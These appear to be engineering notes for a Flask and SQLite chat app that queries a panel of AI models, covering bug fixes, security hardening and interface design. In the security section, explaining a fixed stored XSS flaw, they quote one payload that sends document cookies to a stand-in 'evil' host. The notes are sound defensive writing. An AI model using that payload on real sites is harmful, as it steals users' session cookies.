# Engineering notes

Detail behind the decisions in the main README.

## What was wrong, and what changed

### Crashes in the original prototype

| Problem | Fix |
|---|---|
| `undefined name 'sqllite3'` | Typo; the module is `sqlite3`. |
| `undefined name 'sqlite3'` | `import sqlite3` was missing entirely. |
| `undefined name 'os'` | `import os` was missing; every `os.getenv` call would have raised. |

Those three were fatal on the first request. The rest below only surfaced
later, under load or over time.

### Data integrity

- **Chat deletion could orphan messages.** `delete_chat` ran two statements
  without a transaction. Now a real foreign key with `ON DELETE CASCADE`, and
  the delete happens in one transaction.
- **Connections leaked on error.** Every route did `connect()` → work →
  `close()` with no `try/finally`. Any exception mid-route leaked the handle and
  left the database locked. Now a context manager that commits, rolls back, and
  always closes.
- **Concurrency.** SQLite connections aren't thread-safe and Flask serves on
  multiple threads. Now one connection per request, plus WAL mode so a reader
  is never blocked by the writer.
- **Search matched everything on a `%`.** User input went straight into a
  `LIKE` pattern, so typing `%` returned every chat. Wildcards are now escaped.
- **No indexes.** Added on `messages(chat_id, id)` and `chats(updated_at)`.
- **Migration.** Your existing `database.db` is upgraded in place — new columns
  added, and the old `'User'` / `'One AI'` role values normalised to
  `'user'` / `'assistant'`. Nothing is lost.

### Correctness

- **The assistant had no memory.** Each `/chat` call sent only the current
  prompt, so within a single conversation it couldn't refer to anything said
  earlier. It now replays the last `HISTORY_TURNS` messages.
- **Errors were saved as answers.** On failure the old code set
  `ans = "...Error: {e}"` and then wrote that string into `messages` as an
  assistant reply — permanently poisoning the chat history and the context sent
  to the model. Failures now return HTTP 503 and persist nothing.
- **`prompt[:25]` crashed on a missing message.** A request without `message`
  raised `TypeError` on `None`. All inputs are now validated with clear 400s.
- **`chat_id` type confusion.** `"temp"` is a string, but the code compared
  `chat_id != "temp"` and then used the value as an integer elsewhere. Parsing
  is now centralised in `parse_chat_id`.
- **No timeout on the aggregator call.** Panel calls had `timeout=10`; the final
  synthesis call had none and could hang a worker indefinitely.
- **A single dead model killed the whole response.** Now each node falls through
  a configurable fallback list, and if the entire panel is down the app answers
  directly and flags the response as `degraded` rather than failing.
- **All three "experts" were the same model.** They all called
  `openrouter/free`, which is an auto-router — three round-trips to arrive at
  roughly one model's opinion, three times over. `PANEL_MODELS` now distributes
  nodes across distinct models, which is what makes the ensemble worth its
  latency. Point it at three different model IDs for the real benefit.

### Security

- **Stored XSS in the frontend.** `box.innerHTML += ...${val}...` injected
  message text as live HTML. A message containing
  `<img src=x onerror="fetch('//evil/'+document.cookie)">` executed on render —
  and, because messages are stored, re-executed every time that chat was
  reopened. All user text now goes through `textContent`; model markdown is
  rendered then sanitised with DOMPurify.
- **`debug=True`.** The Werkzeug debugger exposes an interactive Python console
  to anyone who triggers an error. Now off unless `FLASK_DEBUG=true`.
- **`CORS(app)` allowed every origin.** Any website could call your API using
  your credits. CORS is off by default; set `CORS_ORIGINS` only if you need it.
- **Exceptions leaked to the client.** `str(e)` was returned in the response
  body, which can include upstream URLs and key fragments. Errors are now
  logged server-side and generic to the client.
- **No request size limit.** Capped at 1 MB, with a separate 12,000-character
  prompt limit.
- **Secrets in git.** Added `.gitignore` covering `.env` and `*.db`.

### Regenerate corrupted saved history

`regenerate` re-POSTed to `/api/chat`, which appends a new user *and* assistant
message every time. The UI swapped the answer in place, so it looked correct
while the stored transcript quietly accumulated a duplicate exchange per click
-- and those duplicates were then replayed to the model as context on later
turns.

There are now dedicated `POST /api/chats/<id>/regenerate` and
`POST /api/chats/<id>/edit` endpoints that truncate from the target message and
write one replacement. Both generate the new answer **before** truncating, so a
model failure returns 503 and leaves your history exactly as it was rather than
deleting messages and then failing.

### Frontend

- Switched to `/api/*` routes with proper verbs (`PATCH`, `DELETE`); the old
  URLs still work so nothing breaks mid-migration.
- Every `fetch` was unguarded — a failed request threw, leaving the spinner
  running forever with no message. All calls now go through one handler with
  inline errors and a Retry button.
- Double-submit was possible; the send button is now disabled while in flight.
- Search fired a database query on every keystroke; now debounced to 250 ms.
- The magnetic-hover effect ran `querySelectorAll` plus `getBoundingClientRect`
  on every element on every mousemove — layout thrash on a hot path. Now one
  cached list updated by a `MutationObserver`, applied inside the animation
  frame.
- Decorative effects are skipped entirely on touch devices and when
  `prefers-reduced-motion` is set.
- `newChat()` assigned `box` without `let`, creating an implicit global.
- The file picker only showed an alert. Text and code files are now actually
  read and attached to the prompt; binary types say so plainly instead of
  pretending to work.
- Input is now a textarea: Enter sends, Shift+Enter adds a newline.
- Added mobile breakpoints, focus-visible outlines, and `aria-label`s on
  icon-only buttons.

---


---


## Design

**Graphite and brass.** Cool graphite surfaces with one warm brass accent, used
only for things that are live or actionable: the send button, the active chat,
focus rings, and the consensus strip. Nothing is coloured for decoration.

**Two typefaces, one rule.** IBM Plex Sans for prose, IBM Plex Mono for every
piece of instrumentation — timestamps, node counts, date groups, code, table
headers, the version tag. If it is a measurement, it is monospaced. If it is
language, it is not.

**The consensus strip** is the one element carrying the product's identity.
While an answer generates it is the progress readout; when the answer lands it
stays put as the receipt: `3 OF 3 NODES · RECONCILED / 47s`, or
`2 OF 3 NODES · RECONCILED / 31s / PARTIAL PANEL` when a node dropped out. It is
the same component in two states, and the data behind it is stored with the
message, so it is still there when you reopen the chat weeks later.

That honesty matters more than it sounds: the app really does answer from a
degraded panel sometimes, and previously that fact vanished into a toast you
would miss. Now it is attached to the answer permanently.

### What was removed

The old interface had a sparkle trail following the cursor, buttons that pulled
toward the pointer, a title that animated every 60 seconds, emoji standing in
for icons, and a blue-to-purple gradient. All of it is gone. None of it helped
anyone answer a question, the pointer effects ran `getBoundingClientRect` over
every button on every mouse move, and emoji render differently on every OS.

Icons are now inline SVG rather than an icon font: one fewer network request,
and no flash of raw ligature text (`add`, `dock_to_right`) if the font is slow.
For the same reason, if `marked` or `DOMPurify` fail to load, answers fall back
to readable plain text instead of throwing and leaving a blank screen.

Code blocks stay dark in both themes. The syntax theme colours tokens for a dark
surface, and re-theming every token per mode is more fragile than keeping one
surface for code.

